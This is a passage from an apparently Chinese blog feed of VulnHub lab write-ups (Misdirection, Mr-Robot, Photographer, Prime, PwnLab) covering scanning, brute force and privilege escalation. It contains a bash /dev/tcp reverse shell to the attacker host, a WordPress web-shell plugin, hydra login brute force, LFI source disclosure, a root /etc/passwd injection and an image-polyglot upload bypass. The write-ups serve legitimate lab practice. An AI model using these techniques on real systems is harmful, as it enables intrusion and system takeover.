<p><img src="/images/Misdirection-1/6.png" alt="6"></p>
<p>之后进行枚举</p>
<p><img src="/images/Misdirection-1/7.png" alt="7"></p>
<p>发现/etc/passwd对当前用户具有组写入权限，那提权会非常简单，直接写入一个已知密码的0:0用户</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">suser:$1$000$WGcjZIfxKhymgsHNCg2FQ.:0:0::&#x2F;root:&#x2F;bin&#x2F;bash</span><br></pre></td></tr></table></figure>

<p><img src="/images/Misdirection-1/8.png" alt="8"></p>
]]></content>
      <categories>
        <category>vulnhub</category>
      </categories>
      <tags>
        <tag>Linux靶机</tag>
      </tags>
  </entry>
  <entry>
    <title>靶场Mr-Robot-1</title>
    <url>/2020/09/14/%E9%9D%B6%E5%9C%BAMr-Robot-1/</url>
    <content><![CDATA[<h1 id="MrRobot-1"><a href="#MrRobot-1" class="headerlink" title="MrRobot 1"></a>MrRobot 1</h1><p>kali:192.168.1.201</p>
<p>目标:192.168.1.254</p>
<h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><h3 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">masscan -p1-65535 192.168.1.254 --rate&#x3D;1000 -e eth0 &gt; ports</span><br><span class="line">ports&#x3D;$(cat ports | awk -F &quot; &quot; &#39;&#123;print $4&#125;&#39; | awk -F &quot;&#x2F;&quot; &#39;&#123;print $1&#125;&#39; | sort -n | tr &#39;\n&#39; &#39;,&#39; | sed &#39;s&#x2F;,$&#x2F;&#x2F;&#39;)</span><br><span class="line">nmap -Pn -sV -sC -p$ports 192.168.1.254 -oN nmap</span><br></pre></td></tr></table></figure>

<p><img src="/images/Mr-Robot-1/1.png" alt="1"></p>
<h3 id="枚举"><a href="#枚举" class="headerlink" title="枚举"></a>枚举</h3><p>两个http站点，手动查看<br>页面整的花里胡哨的，查看源代码也没啥信息</p>
<p>目录枚举(.php和.txt)</p>
<p><img src="/images/Mr-Robot-1/2.png" alt="2"></p>
<p>找到了许多许多文件，还发现了wordpress</p>
<p>首先检查常规文件robots.txt</p>
<p><img src="/images/Mr-Robot-1/3.png" alt="3"></p>
<p>发现了两个文件，分别查看</p>
<p>socity.dic是一个很大的字典</p>
<p>key-1-of-3.txt是一个md5字符串</p>
<p><img src="/images/Mr-Robot-1/4.png" alt="4"></p>
<h2 id="渗透"><a href="#渗透" class="headerlink" title="渗透"></a>渗透</h2><p>wpscan没有扫到可利用漏洞，尝试爆破wps</p>
<p>这里wps的回显给了很大的提示</p>
<p>用户名错误提示<code>ERROR: Invalid username. Lost your password?</code><br>密码错误提示<code>ERROR: The password you entered for the username Elliot is incorrect. Lost your password?</code></p>
<p>依赖此特性，我们可以枚举当前登录的用户名，并使用它提供的字典<br>但是这字典有点坑，也太大了，我吃完饭回来都没结束，后来发现有好多重复的</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">cat fsocity.dic | sort -u &gt; new.dic</span><br></pre></td></tr></table></figure>

<p>用一个常见的密码(password)进行枚举</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">hydra -L new.dic -p password 192.168.1.254 -s 80 http-form-post &quot;&#x2F;wp-login.php:log&#x3D;^USER^&amp;pwd&#x3D;^PASS^&amp;wp-submit&#x3D;Log+In&amp;redirect_to&#x3D;https%3A%2F%2F192.168.1.254%2Fwp-admin%2F&amp;testcookie&#x3D;1:Invalid&quot; -t 64</span><br></pre></td></tr></table></figure>

<p><img src="/images/Mr-Robot-1/5.png" alt="5"></p>
<p>得到了用户名，再爆破密码</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">hydra -L username -P new.dic 192.168.1.254 -s 80 http-form-post &quot;&#x2F;wp-login.php:log&#x3D;^USER^&amp;pwd&#x3D;^PASS^&amp;wp-submit&#x3D;Log+In&amp;redirect_to&#x3D;https%3A%2F%2F192.168.1.254%2Fwp-admin%2F&amp;testcookie&#x3D;1:login_error&quot; -t 64</span><br></pre></td></tr></table></figure>

<p>这里碰到灵异事件了，如果错误语句为error，这里爆破不出来，如果错误语句为login_error，可以爆破出来，哎，我人傻了</p>
<p><img src="/images/Mr-Robot-1/6.png" alt="6"></p>
<p>后台登录wordpress，<code>Elliot/ER28-0652</code></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">system(&quot;bash -c &#39;bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;192.168.1.201&#x2F;443 0&gt;&amp;1&#39;&quot;);</span><br></pre></td></tr></table></figure>

<p>这里很多方法都可以</p>
<p><strong>安装插件</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">cp &#x2F;usr&#x2F;share&#x2F;seclists&#x2F;Web-Shells&#x2F;WordPress&#x2F;plugin-shell.php &#x2F;root&#x2F;Desktop</span><br><span class="line">zip plugin-shell.zip plugin-shell.php</span><br><span class="line">访问shell</span><br><span class="line">https:&#x2F;&#x2F;192.168.1.254&#x2F;wp-content&#x2F;plugins&#x2F;plugin-shell&#x2F;plugin-shell.php?cmd&#x3D;id</span><br></pre></td></tr></table></figure>

<p><strong>随便找个能写的插件修改</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;wp-content&#x2F;plugins&#x2F;插件名&#x2F;文件名.php</span><br><span class="line">&#x2F;wp-content&#x2F;plugins&#x2F;all-in-one-wp-migration&#x2F;all-in-one-wp-migration.php</span><br></pre></td></tr></table></figure>

<p><strong>修改apperance</strong>，比如Twenty Fifteen: 404 Template (404.php)</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">访问任意一个不存在的页面都可以</span><br></pre></td></tr></table></figure>

<p>或者修改其他可写文件</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">wp-content&#x2F;themes&#x2F;主题&#x2F;文件名.php</span><br><span class="line">https:&#x2F;&#x2F;192.168.1.254&#x2F;wp-content&#x2F;themes&#x2F;twentyfifteen&#x2F;image.php</span><br></pre></td></tr></table></figure>

<p>payload选择</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">system(&quot;bash -c &#39;bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;192.168.1.201&#x2F;443 0&gt;&amp;1&#39;&quot;);</span><br></pre></td></tr></table></figure>

<p><img src="/images/Mr-Robot-1/7.png" alt="7"></p>
<h2 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h2><p>37292.c提权失败</p>
<p>旧版本nmap SUID提权</p>
<p><img src="/images/Mr-Robot-1/8.png" alt="8"></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;usr&#x2F;local&#x2F;bin&#x2F;nmap --interactive</span><br><span class="line">nmap&gt; !sh</span><br></pre></td></tr></table></figure>

<p><img src="/images/Mr-Robot-1/9.png" alt="9"></p>
]]></content>
      <categories>
        <category>vulnhub</category>
      </categories>
      <tags>
        <tag>Linux靶机</tag>
      </tags>
  </entry>
  <entry>
    <title>靶场Photographer</title>
    <url>/2020/09/07/%E9%9D%B6%E5%9C%BAPhotographer/</url>
    <content><![CDATA[<h1 id="Photographer"><a href="#Photographer" class="headerlink" title="Photographer"></a>Photographer</h1><p>攻击机:192.168.3.3</p>
<p>靶机:192.168.3.2</p>
<h2 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h2><p><img src="/images/Photographer/1.jpg" alt="1"></p>
<p>发现了两个http服务端口和samba</p>
<h2 id="枚举"><a href="#枚举" class="headerlink" title="枚举"></a>枚举</h2><p>先对samba进行枚举</p>
<p><img src="/images/Photographer/2.jpg" alt="2"></p>
<p>从中提取出了潜在信息</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">邮箱域名	photographer.com</span><br><span class="line">发件人		 Agi Clarence</span><br><span class="line">收件人		 Daisa</span><br><span class="line">潜在密码?	mybabygirl</span><br></pre></td></tr></table></figure>

<p>接着访问80和8000端口，并分别进行目录枚举 </p>
<p><img src="/images/Photographer/3.jpg" alt="3"></p>
<p>80端口并没有有价值的发现<br>8000端口发现了目录<code>admin</code>，查看后疑似后台登录页面</p>
<p>另外该页面发现</p>
<p><img src="/images/Photographer/4.jpg" alt="4"></p>
<p>Koken CMS</p>
<h2 id="渗透"><a href="#渗透" class="headerlink" title="渗透"></a>渗透</h2><p>寻找公开漏洞(这里最好跟新一下exploitdb)</p>
<p><img src="/images/Photographer/5.jpg" alt="5"></p>
<p>这是一个后台登录的上传漏洞，需要验证</p>
<p>这个时候我们就要到后台登录页面，尝试后台登录</p>
<p><img src="/images/Photographer/6.jpg" alt="6"></p>
<p>看来用户名是邮箱地址，这里我们可以根据之前的信息，推测出这里的管理员账户应该是<code>daisa@photographer.com</code><br>尝试密码mybabygirl，失败</p>
<p>这里有两个思路，1是尝试爆破配合一般字典，2是针对mybabygirl进行密码变异并爆破</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">hydra -l daisa@photographer.com -P &#x2F;usr&#x2F;share&#x2F;seclists&#x2F;Passwords&#x2F;xato-net-10-million-passwords-1000.txt 192.168.3.2 -s 8000 http-form-post &quot;&#x2F;api.php?&#x2F;sessions:email&#x3D;^USER^&amp;password&#x3D;^PASS^:404&quot; -vV -f</span><br></pre></td></tr></table></figure>

<p><img src="/images/Photographer/7.jpg" alt="7"></p>
<p>运气不错，得到了凭据<code>daisa@photographer.com/babygirl</code></p>
<p>之后就是后台上传getshell，这里没有坑，按照文档上进行操作即可</p>
<p><img src="/images/Photographer/8.jpg" alt="8"></p>
<h2 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h2><p>Linpeas</p>
<p><img src="/images/Photographer/10.jpg" alt="10"></p>
<p>直接SUID即可提权</p>
<p><img src="/images/Photographer/9.jpg" alt="9"></p>
<h2 id="后渗透"><a href="#后渗透" class="headerlink" title="后渗透"></a>后渗透</h2><p>发现mysql连接文件</p>
<p><img src="/images/Photographer/11.jpg" alt="11"></p>
<p>发现加密hash</p>
<p><img src="/images/Photographer/12.jpg" alt="12"></p>
<p>john破解</p>
<p><img src="/images/Photographer/13.jpg" alt="13"></p>
]]></content>
      <categories>
        <category>vulnhub</category>
      </categories>
      <tags>
        <tag>Linux靶机</tag>
      </tags>
  </entry>
  <entry>
    <title>靶场Prime_Series_Level-1</title>
    <url>/2020/05/31/%E9%9D%B6%E5%9C%BAPrime-Series-Level-1/</url>
    <content><![CDATA[<h1 id="Prime-1"><a href="#Prime-1" class="headerlink" title="Prime: 1"></a>Prime: 1</h1><p>Kali:192.168.1.3</p>
<p>靶机:192.168.1.215</p>
<h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><h3 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h3><p><img src="/images/Prime1/1.jpg" alt="1"></p>
<p>只开放了22、80</p>
<h3 id="枚举"><a href="#枚举" class="headerlink" title="枚举"></a>枚举</h3><p>默认页面只有一张图片</p>
<p>使用dirb进行目录枚举</p>
<p><img src="/images/Prime1/2.jpg" alt="2"></p>
<p>发现web应用wordpress</p>
<p><img src="/images/Prime1/3.jpg" alt="3"></p>
<p>既然存在wordpress，就可以使用wpscan</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">wpscan --api-token ..... --url http:&#x2F;&#x2F;192.168.1.215&#x2F;wordpress&#x2F; --enumerate vp</span><br></pre></td></tr></table></figure>

<p><img src="/images/Prime1/5.jpg" alt="5"></p>
<p>发现了22个可能的漏洞，但都对渗透没帮助</p>
<p>之后我继续使用dirb进行更详细的枚举</p>
<p><img src="/images/Prime1/4.jpg" alt="4"></p>
<p>发现了<code>secret.txt</code></p>
<p><img src="/images/Prime1/6.jpg" alt="6"></p>
<p>提示了一个github地址和location.txt</p>
<p>得到了提示</p>
<p><img src="/images/Prime1/7.jpg" alt="7"></p>
<h4 id="LFI"><a href="#LFI" class="headerlink" title="LFI"></a>LFI</h4><p>根据提示验证</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">wfuzz -c -z file,&#x2F;usr&#x2F;share&#x2F;wfuzz&#x2F;wordlist&#x2F;general&#x2F;common.txt --hc 404 http:&#x2F;&#x2F;192.168.1.215&#x2F;index.php?FUZZ&#x3D;something</span><br></pre></td></tr></table></figure>

<p><img src="/images/Prime1/8.jpg" alt="8"></p>
<p>过滤掉字符长度12</p>
<p><img src="/images/Prime1/9.jpg" alt="9"></p>
<p>fuzz除了关键词file，和提示吻合</p>
<p>使用提示file和location.txt去读取</p>
<p><img src="/images/Prime1/10.jpg" alt="10"></p>
<p>提示在其他php页面使用参数secrettier360</p>
<p>枚举php页面</p>
<p><img src="/images/Prime1/11.jpg" alt="11"></p>
<p>尝试在枚举出的页面使用参数secrettier360</p>
<p>成功在image.php使用参数secrettier360产生LFI</p>
<p><img src="/images/Prime1/12.jpg" alt="12"></p>
<p>在<code>passwd</code>里发现有有用的信息</p>
<p><img src="/images/Prime1/13.jpg" alt="13"></p>
<p>根据提示读取文件</p>
<p><img src="/images/Prime1/14.jpg" alt="14"></p>
<p>成功发现了密码，所以我们现在拥有的账户名+密码进行登录<br>最后使用<code>victor/follow_the_ippsec</code>成功登录wordpress</p>
<p><img src="/images/Prime1/15.jpg" alt="15"></p>
<p>找到了可以上传代码的地方</p>
<p>经尝试只有<code>secret.php</code>拥有W权限，其他都不可以写入</p>
<p><img src="/images/Prime1/16.jpg" alt="16"></p>
<h2 id="渗透"><a href="#渗透" class="headerlink" title="渗透"></a>渗透</h2><h3 id="PHP-reverse-shell"><a href="#PHP-reverse-shell" class="headerlink" title="PHP_reverse_shell"></a>PHP_reverse_shell</h3><p>输入我们的<code>PHP_reverse_shell</code>的代码获取shell</p>
<p><img src="/images/Prime1/17.jpg" alt="17"></p>
<p>升级成交互式shell</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">python -c &#39;import pty;pty.spawn(&quot;&#x2F;bin&#x2F;bash&quot;)&#39;</span><br><span class="line">Ctrl+Z</span><br><span class="line">stty raw -echo</span><br><span class="line">reset</span><br><span class="line">xterm-color</span><br></pre></td></tr></table></figure>

<p><img src="/images/Prime1/18.jpg" alt="18"></p>
<h2 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h2><p><img src="/images/Prime1/19.jpg" alt="19"></p>
<p>内核提权</p>
<p><img src="/images/Prime1/20.jpg" alt="20"></p>
]]></content>
      <categories>
        <category>vulnhub</category>
      </categories>
      <tags>
        <tag>Linux靶机</tag>
      </tags>
  </entry>
  <entry>
    <title>靶场PwnLab</title>
    <url>/2020/09/14/%E9%9D%B6%E5%9C%BAPwnLab/</url>
    <content><![CDATA[<h1 id="PwnLab"><a href="#PwnLab" class="headerlink" title="PwnLab"></a>PwnLab</h1><p>kali:192.168.1.201</p>
<p>目标:192.168.1.206</p>
<h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><h3 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">masscan -p1-65535 192.168.1.206 --rate&#x3D;1000 -e eth0 &gt; ports</span><br><span class="line">ports&#x3D;$(cat ports | awk -F &quot; &quot; &#39;&#123;print $4&#125;&#39; | awk -F &quot;&#x2F;&quot; &#39;&#123;print $1&#125;&#39; | sort -n | tr &#39;\n&#39; &#39;,&#39; | sed &#39;s&#x2F;,$&#x2F;&#x2F;&#39;)</span><br><span class="line">nmap -Pn -sV -sC -p$ports 192.168.1.206 -oN nmap</span><br></pre></td></tr></table></figure>

<p><img src="/images/PwnLab/1.png" alt="1"></p>
<h3 id="枚举"><a href="#枚举" class="headerlink" title="枚举"></a>枚举</h3><p>dirbuster</p>
<p><img src="/images/PwnLab/2.png" alt="2"></p>
<p>nikto</p>
<p><img src="/images/PwnLab/3.png" alt="3"></p>
<p>接着开始手动检查</p>
<p>一开始就可以检查到一个显眼的位置，注意观察URL</p>
<p>login</p>
<p><img src="/images/PwnLab/4.png" alt="4"></p>
<p>login.php</p>
<p><img src="/images/PwnLab/6.png" alt="6"></p>
<p>upload</p>
<p><img src="/images/PwnLab/5.png" alt="5"></p>
<p>upload.php</p>
<p><img src="/images/PwnLab/7.png" alt="7"></p>
<p>完全一致</p>
<h2 id="渗透"><a href="#渗透" class="headerlink" title="渗透"></a>渗透</h2><p>通过上述条件可以发现page参数八成是一个LFI漏洞，而且包含位置会添加.php后缀<br>尝试00截断读取passwd失败</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;etc&#x2F;passwd</span><br></pre></td></tr></table></figure>

<p>尝试php修饰器读取源码</p>
<p>添加<code>php://filter/read=convert.base64-encode/resource=</code></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;192.168.1.206&#x2F;?page&#x3D;php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;login</span><br><span class="line">http:&#x2F;&#x2F;192.168.1.206&#x2F;?page&#x3D;php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;upload</span><br></pre></td></tr></table></figure>

<p>接着base64解密</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">cat code |base64 -d &gt;upload</span><br><span class="line">cat code2 |base64 -d &gt;login</span><br></pre></td></tr></table></figure>

<p>这样就可以获取源码了</p>
<p>login.php</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">session_start();</span><br><span class="line">require(&quot;config.php&quot;);</span><br><span class="line">$mysqli &#x3D; new mysqli($server, $username, $password, $database);</span><br><span class="line"></span><br><span class="line">if (isset($_POST[&#39;user&#39;]) and isset($_POST[&#39;pass&#39;]))</span><br><span class="line">&#123;</span><br><span class="line">	$luser &#x3D; $_POST[&#39;user&#39;];</span><br><span class="line">	$lpass &#x3D; base64_encode($_POST[&#39;pass&#39;]);</span><br><span class="line"></span><br><span class="line">	$stmt &#x3D; $mysqli-&gt;prepare(&quot;SELECT * FROM users WHERE user&#x3D;? AND pass&#x3D;?&quot;);</span><br><span class="line">	$stmt-&gt;bind_param(&#39;ss&#39;, $luser, $lpass);</span><br><span class="line"></span><br><span class="line">	$stmt-&gt;execute();</span><br><span class="line">	$stmt-&gt;store_Result();</span><br><span class="line"></span><br><span class="line">	if ($stmt-&gt;num_rows &#x3D;&#x3D; 1)</span><br><span class="line">	&#123;</span><br><span class="line">		$_SESSION[&#39;user&#39;] &#x3D; $luser;</span><br><span class="line">		header(&#39;Location: ?page&#x3D;upload&#39;);</span><br><span class="line">	&#125;</span><br><span class="line">	else</span><br><span class="line">	&#123;</span><br><span class="line">		echo &quot;Login failed.&quot;;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line">else</span><br><span class="line">&#123;</span><br><span class="line">	?&gt;</span><br><span class="line">	&lt;form action&#x3D;&quot;&quot; method&#x3D;&quot;POST&quot;&gt;</span><br><span class="line">	&lt;label&gt;Username: &lt;&#x2F;label&gt;&lt;input id&#x3D;&quot;user&quot; type&#x3D;&quot;test&quot; name&#x3D;&quot;user&quot;&gt;&lt;br &#x2F;&gt;</span><br><span class="line">	&lt;label&gt;Password: &lt;&#x2F;label&gt;&lt;input id&#x3D;&quot;pass&quot; type&#x3D;&quot;password&quot; name&#x3D;&quot;pass&quot;&gt;&lt;br &#x2F;&gt;</span><br><span class="line">	&lt;input type&#x3D;&quot;submit&quot; name&#x3D;&quot;submit&quot; value&#x3D;&quot;Login&quot;&gt;</span><br><span class="line">	&lt;&#x2F;form&gt;</span><br><span class="line">	&lt;?php</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>upload.php</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">session_start();</span><br><span class="line">if (!isset($_SESSION[&#39;user&#39;])) &#123; die(&#39;You must be log in.&#39;); &#125;</span><br><span class="line">?&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">	&lt;body&gt;</span><br><span class="line">		&lt;form action&#x3D;&#39;&#39; method&#x3D;&#39;post&#39; enctype&#x3D;&#39;multipart&#x2F;form-data&#39;&gt;</span><br><span class="line">			&lt;input type&#x3D;&#39;file&#39; name&#x3D;&#39;file&#39; id&#x3D;&#39;file&#39; &#x2F;&gt;</span><br><span class="line">			&lt;input type&#x3D;&#39;submit&#39; name&#x3D;&#39;submit&#39; value&#x3D;&#39;Upload&#39;&#x2F;&gt;</span><br><span class="line">		&lt;&#x2F;form&gt;</span><br><span class="line">	&lt;&#x2F;body&gt;</span><br><span class="line">&lt;&#x2F;html&gt;</span><br><span class="line">&lt;?php </span><br><span class="line">if(isset($_POST[&#39;submit&#39;])) &#123;</span><br><span class="line">	if ($_FILES[&#39;file&#39;][&#39;error&#39;] &lt;&#x3D; 0) &#123;</span><br><span class="line">		$filename  &#x3D; $_FILES[&#39;file&#39;][&#39;name&#39;];</span><br><span class="line">		$filetype  &#x3D; $_FILES[&#39;file&#39;][&#39;type&#39;];</span><br><span class="line">		$uploaddir &#x3D; &#39;upload&#x2F;&#39;;</span><br><span class="line">		$file_ext  &#x3D; strrchr($filename, &#39;.&#39;);</span><br><span class="line">		$imageinfo &#x3D; getimagesize($_FILES[&#39;file&#39;][&#39;tmp_name&#39;]);</span><br><span class="line">		$whitelist &#x3D; array(&quot;.jpg&quot;,&quot;.jpeg&quot;,&quot;.gif&quot;,&quot;.png&quot;); </span><br><span class="line"></span><br><span class="line">		if (!(in_array($file_ext, $whitelist))) &#123;</span><br><span class="line">			die(&#39;Not allowed extension, please upload images only.&#39;);</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">		if(strpos($filetype,&#39;image&#39;) &#x3D;&#x3D;&#x3D; false) &#123;</span><br><span class="line">			die(&#39;Error 001&#39;);</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">		if($imageinfo[&#39;mime&#39;] !&#x3D; &#39;image&#x2F;gif&#39; &amp;&amp; $imageinfo[&#39;mime&#39;] !&#x3D; &#39;image&#x2F;jpeg&#39; &amp;&amp; $imageinfo[&#39;mime&#39;] !&#x3D; &#39;image&#x2F;jpg&#39;&amp;&amp; $imageinfo[&#39;mime&#39;] !&#x3D; &#39;image&#x2F;png&#39;) &#123;</span><br><span class="line">			die(&#39;Error 002&#39;);</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">		if(substr_count($filetype, &#39;&#x2F;&#39;)&gt;1)&#123;</span><br><span class="line">			die(&#39;Error 003&#39;);</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">		$uploadfile &#x3D; $uploaddir . md5(basename($_FILES[&#39;file&#39;][&#39;name&#39;])).$file_ext;</span><br><span class="line"></span><br><span class="line">		if (move_uploaded_file($_FILES[&#39;file&#39;][&#39;tmp_name&#39;], $uploadfile)) &#123;</span><br><span class="line">			echo &quot;&lt;img src&#x3D;\&quot;&quot;.$uploadfile.&quot;\&quot;&gt;&lt;br &#x2F;&gt;&quot;;</span><br><span class="line">		&#125; else &#123;</span><br><span class="line">			die(&#39;Error 4&#39;);</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p>可以发现login.php无法sql注入，存在预编译</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$stmt-&gt;bind_param(&#39;ss&#39;, $luser, $lpass);</span><br></pre></td></tr></table></figure>

<p>而upload.php需要登录才能启用</p>
<p>再去包含以下index，看看源码</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">&#x2F;&#x2F;Multilingual. Not implemented yet.</span><br><span class="line">&#x2F;&#x2F;setcookie(&quot;lang&quot;,&quot;en.lang.php&quot;);</span><br><span class="line">if (isset($_COOKIE[&#39;lang&#39;]))</span><br><span class="line">&#123;</span><br><span class="line">	include(&quot;lang&#x2F;&quot;.$_COOKIE[&#39;lang&#39;]);</span><br><span class="line">&#125;</span><br><span class="line">&#x2F;&#x2F; Not implemented yet.</span><br><span class="line">?&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">&lt;title&gt;PwnLab Intranet Image Hosting&lt;&#x2F;title&gt;</span><br><span class="line">&lt;&#x2F;head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;center&gt;</span><br><span class="line">&lt;img src&#x3D;&quot;images&#x2F;pwnlab.png&quot;&gt;&lt;br &#x2F;&gt;</span><br><span class="line">[ &lt;a href&#x3D;&quot;&#x2F;&quot;&gt;Home&lt;&#x2F;a&gt; ] [ &lt;a href&#x3D;&quot;?page&#x3D;login&quot;&gt;Login&lt;&#x2F;a&gt; ] [ &lt;a href&#x3D;&quot;?page&#x3D;upload&quot;&gt;Upload&lt;&#x2F;a&gt; ]</span><br><span class="line">&lt;hr&#x2F;&gt;&lt;br&#x2F;&gt;</span><br><span class="line">&lt;?php</span><br><span class="line">	if (isset($_GET[&#39;page&#39;]))</span><br><span class="line">	&#123;</span><br><span class="line">		include($_GET[&#39;page&#39;].&quot;.php&quot;);</span><br><span class="line">	&#125;</span><br><span class="line">	else</span><br><span class="line">	&#123;</span><br><span class="line">		echo &quot;Use this server to upload and share image files inside the intranet&quot;;</span><br><span class="line">	&#125;</span><br><span class="line">?&gt;</span><br><span class="line">&lt;&#x2F;center&gt;</span><br><span class="line">&lt;&#x2F;body&gt;</span><br><span class="line">&lt;&#x2F;html&gt;</span><br></pre></td></tr></table></figure>

<p>可以发现page确实存在LFI，需要截断才能进一步利用</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">if (isset($_GET[&#39;page&#39;]))</span><br><span class="line">&#123;</span><br><span class="line">	include($_GET[&#39;page&#39;].&quot;.php&quot;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这时发现，login.php require了一个config.php，dirbuster也发现了它，查看源码</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$server	  &#x3D; &quot;localhost&quot;;</span><br><span class="line">$username &#x3D; &quot;root&quot;;</span><br><span class="line">$password &#x3D; &quot;H4u%QJ_H99&quot;;</span><br><span class="line">$database &#x3D; &quot;Users&quot;;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p>得到了mysql的登录凭据，我们可以直接登录对方的3306端口</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">mysql -u root -h 192.168.1.206 -pH4u%QJ_H99</span><br></pre></td></tr></table></figure>

<p><img src="/images/PwnLab/8png.png" alt="8png"></p>
<p>找到了一些信息，使用凭证登录web应用</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">kent&#x2F;JWzXuBJJNy</span><br></pre></td></tr></table></figure>

<p>登陆后就能使用upload.php了</p>
<p><img src="/images/PwnLab/9.png"></p>
<p>审计前upload.php前，先知道我们手上有一个LFI，但是后缀必须为.php。而upload.php使用了白名单，这点我们无法绕过，所以这个LFI失效了</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$whitelist &#x3D; array(&quot;.jpg&quot;,&quot;.jpeg&quot;,&quot;.gif&quot;,&quot;.png&quot;); </span><br></pre></td></tr></table></figure>

<p>检查content-type必须有image</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">if(strpos($filetype,&#39;image&#39;) &#x3D;&#x3D;&#x3D; false) &#123;</span><br><span class="line">	die(&#39;Error 001&#39;);</span><br></pre></td></tr></table></figure>

<p>验证MIME类型</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">if($imageinfo[&#39;mime&#39;] !&#x3D; &#39;image&#x2F;gif&#39; &amp;&amp; $imageinfo[&#39;mime&#39;] !&#x3D; &#39;image&#x2F;jpeg&#39; &amp;&amp; $imageinfo[&#39;mime&#39;] !&#x3D; &#39;image&#x2F;jpg&#39;&amp;&amp; $imageinfo[&#39;mime&#39;] !&#x3D; &#39;image&#x2F;png&#39;) &#123;</span><br><span class="line">	die(&#39;Error 002&#39;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>上传的图片会移动到/upload目录下，并会修改文件名</p>
<p>这样想直接触发shell就别想了，上传的一定是一个图片马，需要LFI触发<br>这个时候发现了index.php的一段代码</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">if (isset($_COOKIE[&#39;lang&#39;]))</span><br><span class="line">&#123;</span><br><span class="line">	include(&quot;lang&#x2F;&quot;.$_COOKIE[&#39;lang&#39;]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这里include了我们可控的cookie，这样我们就可以满足get shell的条件了</p>
<p>我们先bypass一下上传</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">修改文件后缀为.gif</span><br><span class="line">文件开头为	GIF8&lt;?php</span><br></pre></td></tr></table></figure>

<p>制作头部</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">echo &#39;47 49 46 38&#39; | xxd -p -r &gt;magicgif.gif</span><br><span class="line">cat test.gif &gt;&gt; magicgif.gif </span><br></pre></td></tr></table></figure>

<p><img src="/images/PwnLab/20.png" alt="20"></p>
<p><img src="/images/PwnLab/10.png" alt="10"></p>
<p>之后发送给index.php一个构造的cookie，让他包含<code>lang/../upload/恶意文件.jpg</code></p>
